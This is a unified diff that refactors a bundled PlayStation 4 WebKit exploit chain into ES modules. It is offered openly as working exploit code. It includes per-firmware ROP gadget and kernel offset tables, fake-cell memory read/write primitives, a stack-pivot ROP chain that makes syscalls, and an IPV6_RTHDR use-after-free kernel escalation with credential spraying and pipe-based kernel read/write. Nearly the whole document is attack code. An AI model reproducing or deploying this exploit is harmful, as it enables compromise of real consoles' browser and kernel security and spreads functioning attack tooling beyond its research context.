@@ -1,8 +1,6 @@
-/* AUTO-BUNDLED: transpiled for PS4 WebKit FW 12.xx */
 (function() {
 "use strict";
 
-/* === int64.js === */
 function zeroFill(number, width) {
   width -= number.toString().length;
   if (width > 0) {
@@ -85,12 +83,12 @@ function int64(low, hi) {
   return this;
 }
 globalThis.int64 = int64;
+export { int64 };
+export default int64;
 
-int64;
 
-/* === ps4_offsets.js === */
-var REQUIRED_KEYS = ["fw_status", "wk_expm1_builtin", "wk_JSFunction_m_function", "wk_POP_RDI_RET", "wk_POP_RSI_RET", "wk_POP_RDX_RET", "wk_POP_RCX_RET", "wk_POP_RAX_RET", "wk_POP_R8_RET", "wk_POP_R9_RET", "wk_LEAVE_RET", "wk_MOV_QWORD_PTR_RDI_RAX_RET", "wk_MOV_RDI_RSI_30_CALL", "wk_POP_RAX_MOV_RAX_JMP_18", "wk_PUSH_RBP_MOV_RBP_RSP_10", "wk_MOV_RDI_RAX_8_CALL_20", "wk_MOV_RDX_RAX_18_CALL_10", "wk_PUSH_RDX_POP_RSP_RET", "pivot_view_sp", "wk_ArrayBuffer_m_impl", "wk_ArrayBuffer_m_contents_m_data", "wk___imp___error", "k__error", "k_scan_stage1", "k_scan_stage2", "k_evf_cv", "k_sysent_661", "k_jmp_rsi"];
-var OPTIONAL_KEYS = ["k_stubs", "wk___imp_pthread_create", "k_pthread_create",
+export var REQUIRED_KEYS = ["fw_status", "wk_expm1_builtin", "wk_JSFunction_m_function", "wk_POP_RDI_RET", "wk_POP_RSI_RET", "wk_POP_RDX_RET", "wk_POP_RCX_RET", "wk_POP_RAX_RET", "wk_POP_R8_RET", "wk_POP_R9_RET", "wk_LEAVE_RET", "wk_MOV_QWORD_PTR_RDI_RAX_RET", "wk_MOV_RDI_RSI_30_CALL", "wk_POP_RAX_MOV_RAX_JMP_18", "wk_PUSH_RBP_MOV_RBP_RSP_10", "wk_MOV_RDI_RAX_8_CALL_20", "wk_MOV_RDX_RAX_18_CALL_10", "wk_PUSH_RDX_POP_RSP_RET", "pivot_view_sp", "wk_ArrayBuffer_m_impl", "wk_ArrayBuffer_m_contents_m_data", "wk___imp___error", "k__error", "k_scan_stage1", "k_scan_stage2", "k_evf_cv", "k_sysent_661", "k_jmp_rsi"];
+export var OPTIONAL_KEYS = ["k_stubs", "wk___imp_pthread_create", "k_pthread_create",
 // Overrides the patch-blob name, which otherwise derives from the firmware
 // key ("13.00" -> patches/1300.bin). Needed when two firmwares share one
 // kernel and therefore one blob.
@@ -101,7 +99,7 @@ var OPTIONAL_KEYS = ["k_stubs", "wk___imp_pthread_create", "k_pthread_create",
 // construction, so without this a correct alias reports as 20 defects and
 // buries a real one.
 "alias_of"];
-var PS4 = {
+export var PS4 = {
   "11.00": {
     fw_status: "state=proven step4q=90/0 reboot=0 kernel_rvas=5/5-vs-dump",
     wk_expm1_builtin: 0x2193f30,
@@ -576,7 +574,7 @@ PS4["12.52"] = Object.assign({}, PS4["12.50"], {
   fw_status: "state=UNTESTED-on-hardware shares=12.50 " + "webkit=assumed-identical-to-12.50 (no 12.52 module dump) " + "kernel_rvas=asserted-by-supplied-table UNVERIFIED " + "kpatch=1250.bin bug=poops",
   kpatch: "1250.bin"
 });
-function offsetsFor(uaString) {
+export function offsetsFor(uaString) {
   var m = (uaString || "").match(/PlayStation\s+4[\/ ](\d+)\.(\d+)/);
   if (!m) return {
     key: null,
@@ -589,7 +587,7 @@ function offsetsFor(uaString) {
   };
 }
 
-/* === core.js === */
+
 var DRAIN_COUNT = 512;
 var AUTO_RETRY_DELAY_MS = 50;
 var K = 2;
@@ -1543,7 +1541,7 @@ function buildCarrier() {
     }
   };
 }
-function establishPrimitive(options) {
+export function establishPrimitive(options) {
   var opts = options || {};
   if (fakeReleased) return Promise.reject(new Error("core: the fake cell has been released to the real-cell pair -- " + "establishPrimitive cannot run again in this page"));
   if (running) return Promise.reject(new Error("core: already running"));
@@ -1564,11 +1562,11 @@ function establishPrimitive(options) {
     startAttempt();
   });
 }
-function currentCarrier() {
+export function currentCarrier() {
   return liveCandidate === null ? null : buildCarrier();
 }
 var RELEASED_BINDINGS = ["liveCandidate", "fakeHost", "lengthWord", "getterCarrier", "leakedScope", "preparedSymbolObject", "capturedString", "capturedWords", "predecessorWords", "outerGraph", "fillerGraph", "referenceTarget", "keepAlive"];
-function releaseFakeCell() {
+export function releaseFakeCell() {
   var report = {
     released: RELEASED_BINDINGS.slice(),
     alreadyReleased: fakeReleased,
@@ -1600,17 +1598,20 @@ function releaseFakeCell() {
   retryScheduled = false;
   return report;
 }
-function fakeCellReleased() {
+export function fakeCellReleased() {
   return fakeReleased;
 }
-function carrierHeaderCopy() {
+export function carrierHeaderCopy() {
   return rwHeader.slice(0, CELL_BYTES);
 }
-function carrierHomeVector() {
+export function carrierHomeVector() {
   return rwOriginalVector;
 }
+export { profile, aimCarrier, restoreCarrier, plausibleAddress, plausibleCell };
 
-/* === mem.js === */
+
+import { int64 } from "./int64.js";
+import { releaseFakeCell, fakeCellReleased, carrierHeaderCopy, carrierHomeVector } from "./core.js?v=10";
 var carrier = null;
 function toI64(x) {
   if (x instanceof int64) return x;
@@ -1807,7 +1808,7 @@ var workerView = null;
 var workerMirror = null;
 var pairVectorOffset = -1;
 var retained = [];
-var pairStatus = {
+export var pairStatus = {
   state: "not-attempted",
   promoted: false,
   committed: false,
@@ -1952,7 +1953,7 @@ function proveMagic(note, who, slot, at, expected, context) {
   if (!record.pass) throw new Error("mem.promote: ".concat(who, " identity failed -- read ") + "".concat(record.found, " at 0x").concat(target.toString(), ", expected ") + "".concat(record.expected, " (").concat(context, ")"));
   return record;
 }
-function promoteToRealPair(onEvent) {
+export function promoteToRealPair(onEvent) {
   var note = function (tag, detail) {
     pairStatus.stage = tag;
     if (typeof onEvent === "function") {
@@ -2120,7 +2121,7 @@ function promoteToRealPair(onEvent) {
     throw error;
   }
 }
-function installWindowP(c, options) {
+export function installWindowP(c, options) {
   if (!c || typeof c.aim !== "function") throw new TypeError("mem: not a carrier");
   carrier = c;
   var prim = {
@@ -2152,11 +2153,16 @@ function installWindowP(c, options) {
   }
   return prim;
 }
+export { read1, read2, read4, read8, write1, write2, write4, write8, leakval, readInto, toI64, addrNumber, int64 };
 
-/* === chain === */
+
 // ?v=10 must match mem.js's specifier EXACTLY or core.js builds a second
 // module record and releaseFakeCell() (only call site: mem.js:662) reaches a
 // virgin instance, pinning ~137 MB for the life of the page.
+import { establishPrimitive } from "./core.js?v=10";
+import { installWindowP, pairStatus } from "./mem.js";
+import { int64 } from "./int64.js";
+import { offsetsFor } from "./ps4_offsets.js";
 var outEl = document.getElementById("out");
 var stateEl = document.getElementById("state");
 var lines = [];
@@ -2301,7 +2307,7 @@ var RTP_LOOKUP = 0,
 var CPU_LEVEL_WHICH = 3,
   CPU_WHICH_TID = 1;
 var JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
-var keepAlive = [];
+var chainKeepAlive = [];
 var workers = [];
 var mainMf = null,
   mainOrig = null,
@@ -2515,7 +2521,7 @@ var allDone = false;
         pb = new ArrayBuffer(PB_SIZE);
       var kb = new ArrayBuffer(0x2000),
         fb = new ArrayBuffer(0x40);
-      keepAlive.push(sb, pb, kb, fb);
+      chainKeepAlive.push(sb, pb, kb, fb);
       var c = {
         storeDv: new DataView(sb),
         pivotDv: new DataView(pb),
@@ -2524,7 +2530,7 @@ var allDone = false;
         stackU8: new Uint8Array(kb),
         frameU8: new Uint8Array(fb)
       };
-      keepAlive.push(c.storeDv, c.pivotDv, c.stackDv, c.frameDv, c.stackU8, c.frameU8);
+      chainKeepAlive.push(c.storeDv, c.pivotDv, c.stackDv, c.frameDv, c.stackU8, c.frameU8);
       c.S = bufAddr(sb);
       c.P = bufAddr(pb);
       c.K = bufAddr(kb);
@@ -2563,7 +2569,7 @@ var allDone = false;
     mainMf = p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
     mainOrig = p.read8(mainMf);
     var pivotObj = {};
-    keepAlive.push(pivotObj);
+    chainKeepAlive.push(pivotObj);
     var pivotCell = p.leakval(pivotObj);
     p.write8(mainMf, G.G0);
     mainArmed = true;
@@ -2590,22 +2596,22 @@ var allDone = false;
     var pid = sc(SYS.getpid).i32;
     check("chain-reaches-kernel", pid > 0, "pid=" + pid + " uid=" + sc(SYS.getuid).i32);
     var scratchAb = new ArrayBuffer(0x1000);
-    keepAlive.push(scratchAb);
+    chainKeepAlive.push(scratchAb);
     var scratch = bufAddr(scratchAb);
     var argAb = new ArrayBuffer(8);
-    keepAlive.push(argAb);
+    chainKeepAlive.push(argAb);
     var argAddr = bufAddr(argAb),
       argDv = new DataView(argAb);
     var lenAb = new ArrayBuffer(8);
-    keepAlive.push(lenAb);
+    chainKeepAlive.push(lenAb);
     var lenAddr = bufAddr(lenAb),
       lenDv = new DataView(lenAb);
     var sprayAb = new ArrayBuffer(UCRED_SIZE);
-    keepAlive.push(sprayAb);
+    chainKeepAlive.push(sprayAb);
     var sprayAddr = bufAddr(sprayAb),
       sprayDv = new DataView(sprayAb);
     var leakAb = new ArrayBuffer(UCRED_SIZE);
-    keepAlive.push(leakAb);
+    chainKeepAlive.push(leakAb);
     var leakAddr = bufAddr(leakAb),
       leakDv = new DataView(leakAb);
     // R2. getsockopt(IPV6_RTHDR) can copy out FEWER bytes than asked, and
@@ -2683,7 +2689,7 @@ var allDone = false;
     }
     var iovAb = new ArrayBuffer(IOVEC_SIZE * NUM_MSG_IOV);
     var msgAb = new ArrayBuffer(MSGHDR_SIZE);
-    keepAlive.push(iovAb, msgAb);
+    chainKeepAlive.push(iovAb, msgAb);
     var iovAddr = bufAddr(iovAb),
       msgAddr = bufAddr(msgAb);
     var iovDv = new DataView(iovAb),
@@ -2706,11 +2712,11 @@ var allDone = false;
     var slavePipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
     check("karw-pipe-pairs-exist", masterPipe[0] > 0 && masterPipe[1] > 0 && slavePipe[0] > 0 && slavePipe[1] > 0, "master " + masterPipe + "  slave " + slavePipe);
     var dummyAb = new ArrayBuffer(0x1000);
-    keepAlive.push(dummyAb);
+    chainKeepAlive.push(dummyAb);
     new Uint8Array(dummyAb).fill(0x41);
     var dummyAddr = bufAddr(dummyAb);
     var uioIovAb = new ArrayBuffer(IOVEC_SIZE * NUM_UIO_IOV);
-    keepAlive.push(uioIovAb);
+    chainKeepAlive.push(uioIovAb);
     var uioIovAddr = bufAddr(uioIovAb),
       uioIovDv = new DataView(uioIovAb);
     new Uint8Array(uioIovAb).fill(0);
@@ -2776,7 +2782,7 @@ var allDone = false;
       var sLo = (0x10100000 | _i6) >>> 0,
         sHi = (0xc0de0000 | _i6) >>> 0;
       var arr = await w.rpc("init", 15000, sLo, sHi);
-      keepAlive.push(arr);
+      chainKeepAlive.push(arr);
       var D = bufAddr(arr.buffer);
       if (p.read4(D) >>> 0 !== sLo) throw new Error(name + ": transfer did not preserve the store");
       var storage = p.read8(D.add32(0x10));
@@ -2815,7 +2821,7 @@ var allDone = false;
     mark("WORKER-POOLS", "iov=" + iovWorkers.length + " uio=" + uioWorkers.length);
     var prioAb = new ArrayBuffer(8),
       maskAb = new ArrayBuffer(0x10);
-    keepAlive.push(prioAb, maskAb);
+    chainKeepAlive.push(prioAb, maskAb);
     var prioAddr = bufAddr(prioAb),
       maskAddr = bufAddr(maskAb);
     var prioDv = new DataView(prioAb),
@@ -2975,7 +2981,7 @@ var allDone = false;
     function bootFingerprint() {
       var nameAb = new ArrayBuffer(8),
         outAb = new ArrayBuffer(0x10);
-      keepAlive.push(nameAb, outAb);
+      chainKeepAlive.push(nameAb, outAb);
       var nameAddr = bufAddr(nameAb),
         outAddr = bufAddr(outAb);
       var nameDv = new DataView(nameAb);
@@ -3454,7 +3460,7 @@ var allDone = false;
       }).join("+") : addr) + " size=" + size);
       var bufs = uioWorkers.map(function () {
         var ab = new ArrayBuffer(size);
-        keepAlive.push(ab);
+        chainKeepAlive.push(ab);
         // ITEM 2. Sentinel-fill so an EMPTY read is distinguishable
         // from a real read of a zero qword. A fresh buffer is all
         // zeros, which used to sail through the hit test below and
@@ -3684,7 +3690,7 @@ var allDone = false;
         mark("MAKE-KARW-ABORTED", "reason=walk-not-kernel-pointers");
       } else {
         var pbAb = new ArrayBuffer(PIPEBUF_SIZEOF);
-        keepAlive.push(pbAb);
+        chainKeepAlive.push(pbAb);
         var pbAddr = bufAddr(pbAb),
           pbDv = new DataView(pbAb);
         new Uint8Array(pbAb).fill(0);
@@ -3697,7 +3703,7 @@ var allDone = false;
           for (var fd of [masterPipe[0], masterPipe[1], slavePipe[0], slavePipe[1]]) sc(SYS.fcntl, fd, F_SETFL, O_NONBLOCK);
           var kvBufAb = new ArrayBuffer(PIPEBUF_SIZEOF);
           var kvViewAb = new ArrayBuffer(0x40);
-          keepAlive.push(kvBufAb, kvViewAb);
+          chainKeepAlive.push(kvBufAb, kvViewAb);
           var kvBufAddr = bufAddr(kvBufAb),
             kvBufDv = new DataView(kvBufAb);
           var kvViewAddr = bufAddr(kvViewAb),
@@ -3756,19 +3762,19 @@ var allDone = false;
             mark("KERNELVIEW-SUSPECT", "elf=" + (kvElfOk ? 1 : 0) + " agree=" + (kvAgree ? 1 : 0) + " -- repair still runs, later stages self-gate");
           }
           var kvwAb = new ArrayBuffer(0x10);
-          keepAlive.push(kvwAb);
+          chainKeepAlive.push(kvwAb);
           var kvwAddr = bufAddr(kvwAb),
             kvwDv = new DataView(kvwAb);
           // dump scratch: kvwAb is only 0x10, and the pipebuf read
           // needs 0x18. Separate buffers so the dump can never
           // overflow the one the kview accessors use.
           var dmpAb = new ArrayBuffer(0x20);
-          keepAlive.push(dmpAb);
+          chainKeepAlive.push(dmpAb);
           var dmpAddr = bufAddr(dmpAb),
             dmpDv = new DataView(dmpAb);
           var dmpU8 = new Uint8Array(dmpAb);
           var scanAbDump = new ArrayBuffer(0x80 * FILEDESCENT_SIZE);
-          keepAlive.push(scanAbDump);
+          chainKeepAlive.push(scanAbDump);
           var scanAddrDump = bufAddr(scanAbDump);
           var scanDvDump = new DataView(scanAbDump);
           function kview(base) {
@@ -4071,7 +4077,7 @@ var allDone = false;
             }();
             var CHUNK_BYTES = CHUNK_FDS * FILEDESCENT_SIZE;
             var scanAb = new ArrayBuffer(CHUNK_BYTES);
-            keepAlive.push(scanAb); // its address goes to the kernel
+            chainKeepAlive.push(scanAb); // its address goes to the kernel
             var scanAddr = bufAddr(scanAb);
             var scanDv = new DataView(scanAb);
             var wantLo = uafFp.low >>> 0,
@@ -4155,11 +4161,11 @@ var allDone = false;
             var zoneClean = true;
             if (DRAIN_CAP > 0) {
               var dAb = new ArrayBuffer(DRAIN_BATCH * FILEDESCENT_SIZE);
-              keepAlive.push(dAb);
+              chainKeepAlive.push(dAb);
               var dAddr = bufAddr(dAb),
                 dDv = new DataView(dAb);
               var oneAb = new ArrayBuffer(8);
-              keepAlive.push(oneAb);
+              chainKeepAlive.push(oneAb);
               var oneAddr = bufAddr(oneAb),
                 oneDv = new DataView(oneAb);
               var wLo = uafFp.low >>> 0,
@@ -4421,7 +4427,7 @@ var allDone = false;
                 mark("PTHREAD-TABLE", "got=" + fn + " table=" + expect + " agree=" + (agree ? 1 : 0));
                 if (agree) {
                   var thr = new ArrayBuffer(8);
-                  keepAlive.push(thr);
+                  chainKeepAlive.push(thr);
                   var thrAddr = bufAddr(thr);
                   new Uint8Array(thr).fill(0);
                   var _rc = callAddr(expect, [thrAddr, 0, entry, 0]).i32;
@@ -4588,5 +4594,6 @@ var allDone = false;
     mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
   }
 })();
+
 
 })();
